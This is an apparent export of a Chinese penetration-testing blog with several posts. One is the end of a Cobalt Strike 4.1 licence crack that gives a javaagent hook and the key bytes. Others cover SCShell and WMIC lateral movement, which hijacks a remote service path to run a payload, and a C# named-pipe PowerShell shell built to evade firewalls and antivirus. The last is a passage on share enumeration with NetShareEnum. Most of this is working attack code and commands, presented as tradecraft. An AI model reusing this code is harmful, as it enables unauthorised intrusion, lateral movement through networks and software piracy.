包进行修改，那我们再来看看不对源码进行修改的前提下进行 hook。Hook 的原理就是热替换，热替换的核心就在于 Instrumentation 的两个方法： 12345// addTransformer() 用来注册类的修改器；void addTransformer(ClassFileTransformer transformer, boolean canRetransform);// retransformClasses() 会让类重新加载，从而使得注册的类修改器能够重新修改类的字节码。void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException; 这里主要是使用了 addTransformer()，其实原理很简单，就是将 4.2 中编译好的 Authorization() 类进行热替换，从而不去修改 jar 包的情况下完成认证。这部分知识可以参考：javaagent使用指南 4.3.1、读取 Authorization.class首先先读取改写好的 Authorization.class： 12345678910111213141516171819202122232425262728293031// 先读取 Authorization.class，byte[] 转 base64public void toByteArray(String filename) throws IOException&#123; File f = new File(filename); if (!f.exists()) &#123; throw new FileNotFoundException(filename); &#125; ByteArrayOutputStream bos = new ByteArrayOutputStream((int) f.length()); BufferedInputStream in = null; try &#123; in = new BufferedInputStream(new FileInputStream(f)); int buf_size = 1024; byte[] buffer = new byte[buf_size]; int len = 0; while (-1 != (len = in.read(buffer, 0, buf_size))) &#123; bos.write(buffer, 0, len); &#125; String base64Str = Base64.getEncoder().encodeToString(bos.toByteArray()); System.out.println(base64Str); //return base64Str; &#125; catch (IOException e) &#123; e.printStackTrace(); throw e; &#125; finally &#123; try &#123; in.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; bos.close(); &#125;&#125; 然后再编写 addTransformer() 的调用类 4.3.2、Transformer 类12345678910public class Transformer implements ClassFileTransformer &#123; public byte[] transform(ClassLoader loader, String className, Class classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123; if (className.equals("common/Authorization")) &#123; String base64class = "此处为 4.3.1 小节生成的内容"; System.out.println("Found desired class: " + className); classfileBuffer = Base64.getDecoder().decode(base64class); &#125; return classfileBuffer; &#125;&#125; 4.3.3、premain1234567public class CSHook &#123; public static void premain(String paramString, Instrumentation paramInstrumentation) &#123; System.out.println("Hook start"); Transformer transformer = new Transformer(); paramInstrumentation.addTransformer(transformer); &#125;&#125; 注意：指定 premain 方法的位置，这里选择了修改 META-INF/MANIFEST.MF 的内容，将 Main-Class 修改成 Premain-Class。编译生成即可。 最后，这里提供 CS 4.1 的 key ： 1byte[] arrayOfByte2 = &#123; 1, -55, -61, 127, 0, 0, 34, -112, 127, 16, -128, -29, 42, 116, 32, 96, -72, -124, 65, -101, -96, -63, 113, -55, -86, 118 &#125;; 附件：CSHook_4.1.zip 0x05 参考 [1] RSA加密、解密、签名、验签的原理及方法 [2] Java加密解密之MAC（消息认证码） [3] 暴力解决一切？破解AES也是妄想！ [4] Patch Cobalt Strike 4.0 [5] CobaltStrike4.0无Hook蛮力Cracked License思路 [6] Cobaltstrike 4破解之 我自己给我自己颁发license]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>Tools</tag>
        <tag>知识回顾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透技巧】SCshell 技术细节]]></title>
    <url>%2F2019%2F12%2F%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91SCshell%20%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%2F</url>
    <content type="text"><![CDATA[估计最近一段时间不再更新 blog，要更新的话也是对之前的文章修修补补。 0x00 前言SCShell 是一款无文件横向移动的工具，主要依赖于 ChangeServiceConfigA 函数，用于修改 Windows 服务的配置。该工具的优点在于它不会通过 SMB 协议去执行身份验证。该工具是通过 DCE/RPC 协议进行的。 因为是远程修改服务进行的，所以它不需要注册或创建服务。也不会删除远程系统上的任何文件。 与直接使用 sc.exe 的差别在于：如果当前进程无远程主机的权限，则需要使用 SMB 协议进行身份验证，后续步骤两者相同。 0x01 函数 API 介绍1.1、LogonUserA该函数是使用用户和明文密码登陆到本地计算机，无法登陆远程计算机。如果函数成功，则会受到表示已登陆用户的令牌的句柄，然后可以使用此令牌句柄模拟指定用户。 12345678BOOL LogonUserA( LPCSTR lpszUsername, LPCSTR lpszDomain, LPCSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken); lpszUsername：指向以空字符结尾的字符串的指针，该字符串指定用户的名称，也就是要登陆的用户账号。 lpszDomain：指向以空字符结尾的字符串的指针，该字符串指定该账户的域或服务器的名称。如果此参数为 NULL，则必须以 UPN 格式指定用户名。如果此参数为 “.”，则表示使用本地账户来验证。 lpszPassword：指向以空字符结尾的字符串的指针，该字符串指向 lpszUsername 中指定用户的明文密码。结束使用后，可调用 SecureZeroMemory) 函数以清除内存中的密码。 dwLogonType：要执行的登陆操作的类型，共计 7 个类型。此处使用 LOGON32_LOGON_NEW_CREDENTIALS，该登陆类型允许调用方克隆其当前令牌，并为出站连接指定新的凭据。新的登陆会话具有相同的本地标识符，但对其他网络连接使用不同的凭据。 dwLogonProvider：指定登陆提供程序，共计 3 个值。此处使用系统标准登陆提供程序：LOGON32_PROVIDER_DEFAULT phToken：指向句柄变量的指针，该变量接收代码指定用户的令牌的句柄。 返回值：非零值 1.2、ImpersonateLoggedOnUserA与 LogonUserA 函数相呼应。 123BOOL ImpersonateLoggedOnUser( HANDLE hToken); hToken：代表已登陆用户的主或模拟 Access token 的句柄。 返回值：非零值 1.3、OpenSCManagerA建立到指定计算机上的服务控制管理器的连接，并打开指定的服务控制管理器数据库。 12345SC_HANDLE OpenSCManagerA( LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess); lpMachineName： 目标计算机名称，如果指针为 NULL或指向空字符串，则该函数将连接本地计算机上的服务控制管理器。 lpDatabaseName：服务控制管理器数据库的名称。默认情况下此参数应设置为 SERVICES_ACTIVE_DATABASE。 dwDesiredAccess：对服务控制管理器的访问。此处应为 SC_MANAGER_ALL_ACCESS，囊括了列表中的所有权限。有关访问权限列表可参阅【服务安全和访问权限】 返回值： 返回指定服务控制管理器数据库的句柄。 1.4、OpenServiceA通过服务控制管理器打开现有服务。 12345SC_HANDLE OpenServiceA( SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess); hSCManager：服务控制管理器数据库的句柄。 lpServiceName：要打开的服务的名称。该参数是由 CreateService 函数的 lpServiceName 参数指定的名称，而不是用户界面应用程序显示的用于标识服务显示名称。 dwDesiredAccess：访问服务。此处应为 SERVICE_ALL_ACCESS，囊括了列表中的所有权限。有关访问权限列表可参阅【服务安全和访问权限】 返回值： 返回指定服务的句柄。 1.5、QueryServiceConfigA检索指定服务的配置参数。 123456BOOL QueryServiceConfigA( SC_HANDLE hService, LPQUERY_SERVICE_CONFIGA lpServiceConfig, DWORD cbBufSize, LPDWORD pcbBytesNeeded); hService：指定服务的句柄。 lpServiceConfig：指向接收服务配置信息的缓冲区的指针。该数组的最大大小为 8KB。若要确定所需的大小，请设置为 NULL，而 cbBufSize 指定为 0。 cbBufSize：指向的缓冲区大小（以字节为单位）。 pcbBytesNeeded：如果函数失败并显示 ERROR_INSUFFICIENT_BUFFER，则该变量的指针将接收存储所有配置信息所需的字节数。 返回值： 非零值。 1.6、ChangeServiceConfigA更改指定服务的配置参数。 12345678910111213BOOL ChangeServiceConfigA( SC_HANDLE hService, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword, LPCSTR lpDisplayName); hService：指定服务的句柄。 dwServiceType：服务类型。如果不更改现有服务类型，则指定 SERVICE_NO_CHANGE。 dwStartType：服务启动选项。如果不更改现有的启动类型，则指定 SERVICE_NO_CHANGE。因为要执行命令，所以使用 SERVICE_DEMAND_START，后续调用 StartService 函数时启动服务。 dwErrorControl：如果此服务无法启动，应该采取措施应对这个错误。此处应为 SERVICE_ERROR_IGNORE，忽略该错误并继续启动操作。 lpBinaryPathName：服务二进制文件的标准现有路径。如果不更改现有路径，请指定 NULL。如果路径包含空格，则必须使用引号括起来。该路径中还可包含二进制文件的参数。 lpLoadOrderGroup：该服务所属的负载排列组的名称。如果不更改现有组，请指定 NULL。 lpdwTagId：指向变量的指针，该变量接收在 lpLoadOrderGroup 参数指定的组中唯一的标记值。如果不更改现有标签，请指定 NULL。 lpDependencies：指向双 NULL 终止的数组，该数组以空分隔的服务或装入顺序组的名称分隔，系统必须在启动该服务之前才能启动这些名称。（对组的依赖性意味着，在尝试启动该组的所有成员之后，如果该组的至少一个成员正在运行，则该服务可以运行。）如果不更改现有的依赖性，则指定 NULL。 lpServiceStartName：服务将在其下运行的帐户的名称。如果不更改现有帐户名，则指定 NULL。 lpPassword：lpServiceStartName 参数指定的帐户名的密码。如果不更改现有密码，请指定 NULL。 lpDisplayName：用来为其用户标识服务的显示名称。如果不更改现有的显示名称，则指定 NULL。 返回值： 非零值。 1.7、StartServiceA启动指定服务。 12345BOOL StartServiceA( SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors); hService：要启动的服务的句柄。由 OpenService 返回。 dwNumServiceArgs：lpServiceArgVectors 数组中的字符串数。如果 lpServiceArgVectors 为 NULL，则此参数可以为 0。 lpServiceArgVectors：以空值结尾的字符串将作为参数传递给服务的 ServiceMain 函数。如果没有参数，则此参数可以为 NULL。 返回值： 非零值。 0x02 技术细节2.1、时序图 这一整个过程与 PsExec 操作服务的步骤大部分相同，区别仅是因为 SCshell是更改配置，而 PsExec 是创建服务。以下内容是作者的代码实现（典型的 API 调用方式编程）。 2.2、登陆使用 LogonUserA 登陆。后使用 ImpersonateLoggedOnUser。 123456789if(username != NULL) &#123; printf("Username was provided attempting to call LogonUserA\n"); bResult = LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &amp;hToken); if(!bResult) &#123; printf("LogonUserA failed %ld\n", GetLastError()); ExitProcess(0);&#125;bResult = FALSE;bResult = ImpersonateLoggedOnUser(hToken); 2.3、Service Manager一旦当前进程获取了正确的身份验证，即可使用 OpenSCManagerA 打开远程机器的服务控制管理器，并且获取其数据库的句柄。 123456SC_HANDLE schManager = OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS); if(schManager == NULL) &#123; printf("OpenSCManagerA failed %ld\n", GetLastError()); ExitProcess(0); &#125; printf("SC_HANDLE Manager 0x%p\n", schManager); 与该数据库句柄进行交互即可。通过该数据库句柄，使用 OpenServiceA 打开需要的现有服务。比如作者在演示中使用的是 XblAuthManager 服务。后续使用中，为了更方便使用，可以选择一些较为通用的服务代替。 1234567printf("Opening %s\n", serviceName);SC_HANDLE schService = OpenServiceA(schManager, serviceName, SERVICE_ALL_ACCESS);if(schService == NULL) &#123; printf("OpenServiceA failed %ld\n", GetLastError()); ExitProcess(0);&#125;printf("SC_HANDLE Service 0x%p\n", schService); 之所以要查询服务的配置信息，是为了获取原始服务二进制的路径。 123456789101112DWORD dwSize = 0;QueryServiceConfigA(schService, NULL, 0, &amp;dwSize);if(dwSize) &#123; // This part is not critical error will not stop the program dwLpqscSize = dwSize; printf("LPQUERY_SERVICE_CONFIGA need 0x%08x bytes\n", dwLpqscSize); lpqsc = GlobalAlloc(GPTR, dwSize); bResult = FALSE; bResult = QueryServiceConfigA(schService, lpqsc, dwLpqscSize, &amp;dwSize); originalBinaryPath = lpqsc-&gt;lpBinaryPathName; printf("Original service binary path \"%s\"\n", originalBinaryPath);&#125; 使用 ChangeServiceConfigA 更改已打开的服务的配置。通常可以直接使用 C:\Windows\System32\cmd.exe args1 args2 这样的配置替换掉二进制文件路径中的内容。 1bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, NULL, NULL, NULL, NULL, NULL, NULL); 通过调用 StartService 函数时启动已更改配置的服务。 1bResult = StartServiceA(schService, 0, NULL); 最后再次使用 ChangeServiceConfigA 还原服务的配置。 123456789if(dwLpqscSize) &#123; bResult = FALSE; bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, NULL, NULL, NULL, NULL, NULL, NULL); if(!bResult) &#123; printf("ChangeServiceConfigA failed to revert the service path. %ld\n", GetLastError()); ExitProcess(0); &#125; printf("Service path was restored to \"%s\"\n", originalBinaryPath);&#125; 整个过程还是比较简单的。 0x03 C# 实现能在 MSDN 中找到的函数，在 pinvoke.net 中基本能找到对相应的例子，所以直接引用即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697static void Main(string[] args)&#123; Console.WriteLine(); Console.WriteLine("=============== SharpSCShell --&gt; Revised at Rcoil (C# version) =============== "); Console.WriteLine(); if (args.Length &lt; 2) &#123; Console.WriteLine("SharpSCShell.exe target service payload domain username password"); Environment.Exit(0); &#125; .... Console.WriteLine("[*] Trying to connect to &#123;0&#125;", target); bool bResult = false; if (username != null) &#123; Console.WriteLine("[*] Username was provided attempting to call LogonUser"); bResult = LogonUser(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, ref phToken); if (!bResult) &#123; Console.WriteLine("[!] LogonUser failed. Error:&#123;0&#125;", GetLastError()); Environment.Exit(0); &#125; &#125; bResult = ImpersonateLoggedOnUser(phToken); if (!bResult) &#123; Console.WriteLine("[!] ImpersonateLoggedOnUser failed. Error:&#123;0&#125;", GetLastError()); Environment.Exit(0); &#125; IntPtr SCMHandle = OpenSCManager(target, null, (uint)SCM_ACCESS.SC_MANAGER_ALL_ACCESS); if (SCMHandle == IntPtr.Zero) &#123; Console.WriteLine("[!] OpenSCManagerA failed! Error:&#123;0&#125;", GetLastError()); Environment.Exit(0); &#125; Console.WriteLine("[*] SC_HANDLE Manager 0x&#123;0&#125;", SCMHandle); Console.WriteLine("[*] Opening &#123;0&#125; Service ....", ServiceName); IntPtr schService = OpenService(SCMHandle, ServiceName, ((uint)SERVICE_ACCESS.SERVICE_ALL_ACCESS)); Console.WriteLine("[*] SC_HANDLE Service 0x&#123;0&#125;", schService); QueryServiceConfigStruct qscs = new QueryServiceConfigStruct(); IntPtr qscPtr = Marshal.AllocCoTaskMem(0); int retCode = QueryServiceConfig(schService, qscPtr, 0, ref bytesNeeded); if (retCode == 0 &amp;&amp; bytesNeeded == 0) &#123; Console.WriteLine("[!] QueryServiceConfig failed to read the service path. Error:&#123;0&#125;", GetLastError()); &#125; else &#123; Console.WriteLine("[*] LPQUERY_SERVICE_CONFIGA need &#123;0&#125; bytes", bytesNeeded); qscPtr = Marshal.AllocCoTaskMem(bytesNeeded); retCode = QueryServiceConfig(schService, qscPtr, bytesNeeded, ref bytesNeeded); qscs.binaryPathName = IntPtr.Zero; qscs = (QueryServiceConfigStruct)Marshal.PtrToStructure(qscPtr, new QueryServiceConfigStruct().GetType()); &#125; string originalBinaryPath = Marshal.PtrToStringAuto(qscs.binaryPathName); Console.WriteLine("[*] Original service binary path \"&#123;0&#125;\"", originalBinaryPath); Marshal.FreeCoTaskMem(qscPtr); bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, null, null, null, null, null, null); if (!bResult) &#123; Console.WriteLine("[!] ChangeServiceConfigA failed to update the service path. Error:&#123;0&#125;", GetLastError()); Environment.Exit(0); &#125; Console.WriteLine("[*] Service path was changed to \"&#123;0&#125;\"", payload); bResult = StartService(schService, 0, null); uint dwResult = GetLastError(); if (!bResult &amp;&amp; dwResult != 1053) &#123; Console.WriteLine("[!] StartServiceA failed to start the service. Error:&#123;0&#125;", GetLastError()); Environment.Exit(0); &#125; else &#123; Console.WriteLine("[*] Service was started"); &#125; bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, null, null, null, null, null, null); if (!bResult) &#123; Console.WriteLine("[!] ChangeServiceConfigA failed to revert the service path. Error:&#123;0&#125;", GetLastError()); Environment.Exit(0); &#125; else &#123; Console.WriteLine("[*] Service path was restored to \"&#123;0&#125;\"", originalBinaryPath); &#125;&#125; 运行结果： 运行流量： 可以较为明显的看到是 DCE/RPC 协议进行的，且整个过程的 API 调用看得清清楚楚。 项目源码已发布至 Github，请注意查收：SharpSCShell，并将此源码合并至作者的 SCShell 0x04 日志使用用户凭证连接目标时，会留下正常的登陆日志，4624。同时如果服务超时，也会产生 7009 日志。当然，如果直接使用 ELK 监视事件 ID 4657，也是有惊喜的，而且很明显。 该工具经过测试，当防火墙打开时无法连接，且大部分命令无法执行，原因有待探究。 0x05 WMICWMIC 与 SCShell 有类似的功能。 步骤1： 获取目标服务的当前 pathName，以便我们在运行命令后就可以将其还原（在本例中为 XblAuthManager） 1wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' get pathName 步骤2：将 pathName 更改为要运行的任何命令 1wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe C:\testPayload.xml" 步骤3：启动修改后的服务 1wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call startservice 步骤4：将服务 pathName 更改回其原始值 1wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\system32\svchost.exe -k netsvcs" 这一部分本来打算另起一文，在写 WMI 放入，但想想之后的文章还是留在知识星球进行自我沉淀。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>SCShell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【知识回顾】命名管道]]></title>
    <url>%2F2019%2F11%2F%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%2F</url>
    <content type="text"><![CDATA[本文是根据之前文章中涉及到的命名管道的一个理解和延伸进行编写的。 PS：本文开始是投稿于安全客。但由于和别的稿件冲突了，相比下另一篇在原理探究，利用上会稍详尽一些些。只能说两篇文章是从不同角度进行的，建议结合阅读，文章连接：Windows 命名管道研究初探。 0x00 介绍之前在写 深入了解 PsExec [知识回顾]和了解 SMB Beacon 的时候，知道了它们都是通过【知识回顾】命名管道进行通信，所以本文通过一个常见的场景进行编写并绕过说明。 场景建立：在 Windows 环境中，无管理员权限的情况下，对已获取权限的机器上使用 ncat 反弹一个 shell，但是遭到防火墙或反病毒程序的阻拦 。 0x01 Windows 防火墙行为分析在 Windows 中，当尝试使用 Bind() 绑定一个 TCP Socket 时，Defender 会弹窗提示是否允许此程序进行网络连接，只有用户点击允许访问才可放行。当然，如果我们拥有管理员权限，可以将此程序添加到白名单中，允许连接。但我们这里使用的普通用户权限，是无法添加修改防火墙规则的。所以当无权限进行修改时，注定会弹窗提示，也意味着我们的此攻击操作注定失败。 12# 添加的防火墙规则netsh advfirewall firewall add rule name="ncat.exe" dir=in program="E:\Code\Ncat\ncat.exe" action=allow 如果不添加防火墙规则，则会出现下图情况。 这种情下，Reverse shell 也是会失败的，那么我们该如何绕过这种限制呢？ 其实，这个很简单： 我们就直接利用防火墙默认允许的规则就行。 在 Windows 中，通常默认允许 SMB 协议 出入站，因此，如果有什么功能或机制可以用于与外部机器进行通信的，SMB 协议 无疑是一种很好的选择。而 【知识回顾】命名管道 就是基于 SMB 协议 进行通信的，所以我们可以基于【知识回顾】命名管道与外部机器进行通信，从而建立控制通道。 0x02 【知识回顾】命名管道“命名管道” 又名 “命名管线”，但是通常都叫命名管道，是一种简单基于 SMB 协议的进程间通信（Internet Process Connection - IPC）机制。 在计算机编程里，命名管道可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持可靠的、单向或双向的数据通信传输。这完全符合我们的需求。 和一般的管道不同，命名管道可以被不同进程以不同的方式方法调用（可以跨语言、跨平台）。只要程序知道命名管道的名字，任何进程都可以通过该名字打开管道的另一端，根据给定的权限和服务器进程通信。 默认情况下，我们无法使用命名管道来控制计算机通信，但是微软提供了很多种 Windows API 函数，例如 ： 用于实例化命名管道的服务器端函数是 CreateNamedPipe 接受连接的服务器端功能是 ConnectNamedPipe.aspx) 客户端进程通过使用 CreateFile 或 CallNamedPipe 函数连接到命名管道 命名规范 命名管道的命名是采用的 UNC 格式：\\Server\Pipe\[Path]Name 的。 第一部分\\Server指定了服务器的名字，命名管道服务即在此服务器创建，其字符串部分可表示为一个小数点(表示本机)、星号(当前网络字段)、域名或是一个真正的服务；第二部分 \Pipe 与邮槽的 \Mailslot 一样是一个不可变化的硬编码字串，以指出该文件是从属于 NTFS；第三部分[Path]Name则使应用程序可以唯一定义及标识一个命名管道的名字，而且可以设置多级目录。 在 C#中，若要实现命名管道，如今只需要使用 NamedPipeServerStream 和 NamedPipeClientStream 类，开盒即食。 0x03 使用 C#实现命名管道既可以支持直接字节传输模式（PipeTransmissionMode.Byte），也可以支持消息传输模式（PipeTransmissionMode.Message） 。 在字节模式中，信息以连续字节流的形式在客户与服务器之间流动。这也就意味着对于客户机应用和服务器应用在任何一个特定的时间段内都无法准确知道有多少字节从管道中读出或写入。在这种通信模式中，一方在向管道写入某个数量的字节后并不能保证管道的另一方能读出等量的字节。 对于消息模式，客户机和服务器则是通过一系列不连续的数据包进行数据的收发。从管道发出的每一条消息都必须作为一条完整的消息读入。 在此建议使用消息模式。 下面先看看字节模式。 3.1、 测试服务端代码1234567891011121314151617181920212223242526private static void WaitData()&#123; // 创建命名管道 using (NamedPipeServerStream pipeServer = new NamedPipeServerStream("testpipe", PipeDirection.InOut, 1)) &#123; try &#123; Console.WriteLine("[*] Waiting for client connection..."); // 等待连接 pipeServer.WaitForConnection(); Console.WriteLine("[*] Client connected."); // 指定传输模式 pipeServer.ReadMode = PipeTransmissionMode.Byte; using (StreamReader sr = new StreamReader(pipeServer)) &#123; string con = sr.ReadToEnd(); Console.WriteLine(con); &#125; &#125; catch (IOException e) &#123; throw e; &#125; &#125;&#125; 3.2、测试客户端代码1234567891011121314151617181920212223private static void SendData(string ServerName)&#123; try &#123; // 连接服务端命名管道 using (NamedPipeClientStream pipeClient = new NamedPipeClientStream(ServerName, "testpipe", PipeDirection.InOut, PipeOptions.None, TokenImpersonationLevel.None)) &#123; pipeClient.Connect(); Console.WriteLine("[+] Connection established succesfully."); using (StreamWriter sw = new StreamWriter(pipeClient)) &#123; sw.WriteLine("xixixi"); sw.Flush(); &#125; &#125; &#125; catch (Exception ex) &#123; throw ex; &#125;&#125; 3.3、测试结果 此项测试使用的是字节传输模式（PipeTransmissionMode.Byte）。但为了执行命令，我们将上面的代码改成了 PipeTransmissionMode.Message 模式，并且需要引入之前在翻译文章 丢掉Powershell.exe来渗透测试 中看到的执行命令的一个方法。 12345678910111213141516private static string RunScript(string script) &#123; Runspace MyRunspace = RunspaceFactory.CreateRunspace(); MyRunspace.Open(); Pipeline MyPipeline = MyRunspace.CreatePipeline(); MyPipeline.Commands.AddScript(script); MyPipeline.Commands.Add("Out-String"); Collection&lt;PSObject&gt; outputs = MyPipeline.Invoke(); MyRunspace.Close(); StringBuilder sb = new StringBuilder(); foreach (PSObject pobject in outputs) &#123; sb.AppendLine(pobject.ToString()); &#125; return sb.ToString(); &#125; 0x04 shell 实现我们完全可以按照 Psexec 的原理，自己构建一个命令执行的通道。 4.1、服务端实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960private static void WaitData()&#123; // 创建一个运行空间 Runspace runspace = null; runspace = RunspaceFactory.CreateRunspace(); runspace.ApartmentState = System.Threading.ApartmentState.STA; runspace.Open(); while(true) &#123; using (var pipeServer = new NamedPipeServerStream( "testpipe", PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message)) &#123; Console.WriteLine("[*] Waiting for client connection..."); pipeServer.WaitForConnection(); Console.WriteLine("[*] Client connected."); while (true) &#123; var messageBytes = ReadMessage(pipeServer); var line = Encoding.Default.GetString(messageBytes); Console.WriteLine("[*] Received: &#123;0&#125;", line); if (line.ToLower() == "exit") &#123; return; &#125; // 参考：https://decoder.cloud/2017/11/02/we-dont-need-powershell-exe/ try &#123; Pipeline PsPipe = runspace.CreatePipeline(); PsPipe.Commands.AddScript(line); PsPipe.Commands.Add("Out-String"); Collection&lt;PSObject&gt; results = PsPipe.Invoke(); StringBuilder stringBuilder = new StringBuilder(); foreach (PSObject obj in results) &#123; stringBuilder.AppendLine(obj.ToString()); &#125; var response = Encoding.Default.GetBytes(stringBuilder.ToString()); try &#123; pipeServer.Write(response, 0, response.Length); &#125; catch &#123; Console.WriteLine("[!] Pipe is broken!"); break; &#125; &#125; catch (Exception e)&#123;&#125; &#125; &#125; &#125;&#125; 4.2、客户端实现12345678910111213141516171819202122private static void SendData(string ServerName)&#123; Console.WriteLine("[+] Connecting to " + ServerName); using (var pipeClient = new NamedPipeClientStream(ServerName, "testpipe", PipeDirection.InOut)) &#123; pipeClient.Connect(5000); pipeClient.ReadMode = PipeTransmissionMode.Message; Console.WriteLine("[+] Connection established succesfully."); do &#123; Console.Write("csexec&gt; "); var input = Console.ReadLine(); if (String.IsNullOrEmpty(input)) continue; byte[] bytes = Encoding.Default.GetBytes(input); pipeClient.Write(bytes, 0, bytes.Length); if (input.ToLower() == "exit") return; var result = ReadMessage(pipeClient); Console.WriteLine(); Console.WriteLine(Encoding.Default.GetString(result)); &#125; while (true); &#125;&#125; 4.3、测试结果 注意：此时的操作，是根据当前 Client 的权限进行的。 抓包看看此时的网络情况。 这整个过程与 Psexec 差不多一致，只是缺少了与 服务控制管理器（SCM） 进行通信的过程。整个过程中防火墙和反病毒程序无任何阻拦。如果要应用于实战中，可以将内容先进行加密在进行传输。 这里再说一个关于平时常用的 IPC$。 IPC 中文翻译网络进程连接服务，也就是说这个是为 “进程” 间建立网络连接而存在的服务，说的再明确点就是：IPC$ 是一个为 “各类进程” 建立网络通信连接而存在的服务。 那么，为什么 SMB Beacon 中，为什么不需要账号密码呢？这个问题留给你们探索！！！ 0x05 参考如何：使用命名管道进行网络进程间通信【C#】解析C#中管道流的使用命名管道实践NamedPipeshttps://docs.microsoft.com/zh-cn/windows/win32/ipc/named-pipesWe don’t need powershell.exe]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>知识回顾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【域渗透】获取域内机器共享]]></title>
    <url>%2F2019%2F11%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%9C%BA%E5%99%A8%E5%85%B1%E4%BA%AB%2F</url>
    <content type="text"><![CDATA[在域内遇到瓶颈时，不妨看看域内机器开放的共享，获取有些收获。 0x00 前言大多数内网渗透总结在提到使用 WinAPI枚举系统 只是讲述了利用 NetSessionEnum 来找寻登陆 sessions， 利用 NetWkstaUserEnum 来枚举登陆的用户，利用 NetShareEnum 来找寻共享，但却未说明其原型理论。由于前篇文章 【域渗透】域内会话收集) 已经针对 NetSessionEnum 和 NetWkstaUserEnum 进行说明，所以本文是对 NetShareEnum 做一个概述及应用的补充。 0x01 NetShareEnum 函数以当前权限检索有关服务器上每个共享资源的信息。还可以使用 WNetEnumResource 函数来检索资源信息。但是，WNetEnumResource不会枚举隐藏的共享或连接到共享的用户。 该函数原型为： 它需要 7 个参数。 servername：指向一个字符串的指针，该字符串指定要在其上执行该功能的远程服务器的DNS或NetBIOS名称。如果此参数为NULL，则使用本地计算机 level：指定数据的信息级别。 | 值 | 含义 | | —- | —————————————- | | 0 | 返回共享名称。所述bufptr参数指向的数组 SHARE_INFO_0结构。 | | 1 | 返回有关共享资源的信息，包括资源的名称和类型以及与资源关联的注释。所述bufptr参数指向的数组 SHARE_INFO_1结构。 | | 2 | 返回有关共享资源的信息，包括资源名称，类型和权限，密码以及连接数。所述bufptr参数指向的数组 SHARE_INFO_2结构。 | | 502 | 返回有关共享资源的信息，包括资源名称，类型和权限，连接数以及其他相关信息。所述bufptr参数指向的数组 SHARE_INFO_502结构。不返回来自不同范围的共享。有关范围界定的更多信息，请参见NetServerTransportAddEx函数的文档的“备注”部分。 | | 503 | 返回有关共享资源的信息，包括资源名称，类型和权限，连接数以及其他相关信息。所述bufptr参数指向的数组SHARE_INFO_503结构。返回所有范围的共享。如果此结构的shi503_servername成员为“ *”，则没有配置的服务器名称，并且NetShareEnum函数枚举所有未作用域名称的共享。Windows Server 2003和Windows XP： 不支持此信息级别。 | bufptr：向接收数据的缓冲区的指针。该数据的格式取决于 level 参数的值。 prefmaxlen：指定返回数据的首选最大长度，以字节为单位。如果指定MAX_PREFERRED_LENGTH，则该函数分配数据所需的内存量。如果在此参数中指定另一个值，则它可以限制函数返回的字节数。如果缓冲区大小不足以容纳所有条目，则该函数返回ERROR_MORE_DATA。 entriesread：指向一个值的指针，该值接收实际枚举的元素数。 totalentries：指向一个值的值，该值接收可能已经枚举的条目总数。 resume_handle：指向包含恢复句柄的值的指针，该恢复句柄用于继续现有的共享搜索。 而此 API 的调用示例为： 12string server = "rcoil.me";int ret = NetShareEnum(server, 1, ref bufPtr, MAX_PREFERRED_LENGTH, ref entriesread, ref totalentries, ref resume_handle); 它会返回如下内容： 1234567shi1_netname - ADMIN$shi1_remark - Remote managementshi1_netname - C$shi1_remark - Default shareshi1_netname - SYSVOLshi1_remark - Logon server share.... 